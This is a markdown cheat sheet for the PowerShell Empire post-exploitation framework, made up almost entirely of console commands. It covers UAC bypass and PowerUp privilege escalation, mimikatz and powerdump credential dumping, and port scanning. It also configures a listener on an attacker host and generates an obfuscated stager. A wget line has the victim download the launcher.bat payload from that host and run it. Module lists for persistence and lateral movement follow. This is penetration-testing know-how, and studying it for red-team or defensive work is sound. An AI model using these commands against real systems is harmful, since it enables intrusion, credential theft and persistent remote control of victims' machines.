# BypassUac

## BypassUac module
[Source](https://alpinesecurity.com/blog/empire-a-powershell-post-exploitation-tool)

`info` 

If you type info, it will show you information about the victim machine. 
The most important information would be the _high_integrity_ flag. You can see that it is set to 0, which means we do not have SYSTEM privileges.
To increase the _high_integrity_ flag, we would need to elevate privileges.

To do this, type usemodule _powershell/privesc/bypassuac_env_ or _privesc/bypassuac_. Set Listener to http, since we are using a http listener, and Agent to the agent from the victim machine.

`(Empire: agents) > usemodule powershell/privesc/bypassuac_env`

`(Empire: powershell/privesc/bypassuac_env) > set Listener http`

`(Empire: powershell/privesc/bypassuac_env) > set Agent Win10SEC`

`(Empire: powershell/privesc/bypassuac_env) > back`

`(Empire) > agents`

`(Empire: agents) > interact K1NVE34D`

`(Empire: K1NVE34D) > info`

## BypassUac with pop up UAC prompt

`(Empire: Agent007) > usemodule privesc/ask`

`set Listener http`

`run`

## Powerup Privileges Escalation

`(Empire: Agent007) > usemodule privesc/powerup/allchecks`

# Dump creds

## Mimikatz

In addition to modules, the empire has tools. For example, mimikatz.

`(Empire: Agent007) > mimikatz`

To run them, you need to go to command prompt of the required agent

## PowerUp

`(Empire: RMVFSLPW) > usemodule credentials/powerdump*`

`(Empire: powershell/credentials/powerdump) > run`

# Port scanners

`(Empire: Agent007) > searchmodule portscan`

`(Empire: Agent007) > usemodule situational_awareness/network/portscan`

`(Empire: situational_awareness/network/portscan) > set Hosts 10.10.10.10`

`(Empire: situational_awareness/network/portscan) > run`

# Wrap up

`main`

`agents`

`kill all`

`listeners`

`kill http`

# Overview

## Usefull commands

`sc` - takes a screenshot, default is PNG. Giving a ratio means using JPEG

`rename NewAgent` - rename agent

`searchmodule powerup` - search modules

`shell ipconfig` - execute command

## Type of modules

`code_execution` - these modules let you run code, including Metasploit payloads, on the target box

`collection` - these modules let you pillage information from the target machine

`credentials` - these modules let you plunder usernames, hashes, and passwords from the target

`exploitation` - these modules let you exploit additional targets

`lateral_movement` - these modules let you pivot to other target machines

`management` - these modules are associated with system administration functions on the target

`persistence` - these modules will make your agent survive across user logoff or reboot.

`privesc` these modules provide privilege escalation exploits.

`recon` these are the reconnaissance modules.

`situational_awareness` these modules pull information from the target environment, including scanners and related tools.

`trollsploit` these modules let you troll the user sitting at the victim machine’s console, including playing audio and popping up dialog boxes.


## Configure a listeners

`listeners`

`(Empire: listeners) > uselistener <Tab><Tab>`

`(Empire: listeners) > uselistener http`

`(Empire: listeners/http) > info`

Note that we have options here:

`KillDate` - after which time the listener will stop listening

`StagingKey` - a pseudo-random StagingKey for encrypting communications between agent and listener

`WorkingHours` - to limit the time when agents will actively call back to the listener

`DefaultDelay` - (default 5) agents are asynchronous and the DefaultDelay specifies how often the agent will check in

`(Empire: listeners/http) > set DefaultDelay 1`

`(Empire: listeners/http) > set Port 8080`

`(Empire: listeners/http) > set Host http://192.168.1.200:8080`

`(Empire: listeners/http) > execute`

`(Empire: listeners/http) > listeners`

## Deploy an agent

`(Empire) > usestager <Tab><Tab>`

`(Empire) > usestager windows/launcher_bat`

`(Empire: stager/windows/launcher_bat) > info`

`(Empire: stager/windows/launcher_bat) > set Listener http`

`(Empire: stager/windows/launcher_bat) > set Obfuscate True`

`(Empire: stager/windows/launcher_bat) > generate`

The agent can be accessed by the web server

`cd /tmp`

`python -m http.server`

On the target machine, execute the following command to download the agent

`wget http://192.168.1.200:8000/launcher.bat -OutFile launcher.bat`

`./launcher.bat`

## Active agent

`(Empire) > agents` - agents menu

`(Empire: agents) > ?`

`(Empire: agents) > interact C9SEXLWT`

## Modules

`(Empire: Agent007) > usemodule <Tab><Tab>` - list of available modules

`(Empire: Agent007) > usemodule situational_awareness/host/winenum`

`(Empire: powershell/situational_awareness/host/winenum) > execute`